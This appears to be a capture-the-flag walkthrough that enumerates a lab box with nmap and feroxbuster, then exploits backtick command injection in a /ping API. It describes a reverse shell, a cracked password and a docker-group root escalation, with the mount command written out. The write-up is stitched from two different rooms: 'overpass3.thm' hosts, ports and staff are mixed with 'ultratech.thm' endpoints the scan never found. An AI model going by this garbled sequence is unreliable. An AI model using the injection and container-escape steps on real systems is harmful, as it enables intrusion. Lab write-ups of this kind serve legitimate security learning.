# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx overpass3.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV overpass3.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix
```

# FTP (port 21)
we'll try to connect to the FTP server with anonymous account
```bash
$ ftp overpass3.thm                                                                                    
Connected to overpass3.thm.
220 (vsFTPd 3.0.3)
Name (overpass3.thm:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
```

it's not working, let's move to next

# Node.js (port 8081)
we found that there is an api running on port 8081 (custom one ?) : UltraTech API v0.1.3\
we do a feroxbuster and find some interisting URL :
http://ultratech.thm:8081/auth
http://ultratech.thm:8081/ping

in auth, if we send a GET request with login and password as query parameters, we have invalid credentials\
the /ping/ url is interisting : we can set a query parameter ip and it pings the ip\
maybe we can inject one command

# HTTP (port 31331)
On the homepage, we learn there is 4 employees
```bash
Paradox - Our lead web designer, Paradox can help you create your dream website from the ground up\
Elf - Overpass' newest intern, Elf. Elf helps maintain the webservers day to day to keep your site running smoothly and quickly.\
MuirlandOracle - HTTPS and networking specialist. Muir's many years of experience and enthusiasm for networking keeps Overpass running, and your sites, online all of the time.\
NinjaJc01 - James started Overpass, and keeps the business side running. If you have pricing questions or want to discuss how Overpass can help your business, reach out to him!\
```
we found a robots.txt
```bash
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

if we visit the /utech_sitemap.txt
```bash
/
/index.html
/what.html
/partners.html
```

we exploit the ping API with using the ``` ` ``` char that is interpreted as bash and not filtered\
we do a reverse shell

we found a file 
we crack the password of r00t that is : n100906

finally we found that r00t user is in docker group so we can privesc
```sh
r00t@ultratech-prod:~$ groups
r00t docker
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
```

and we are finally root on docker, we can access filesystem by browsing to /mnt
```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt -it bash
bash-5.0#
```
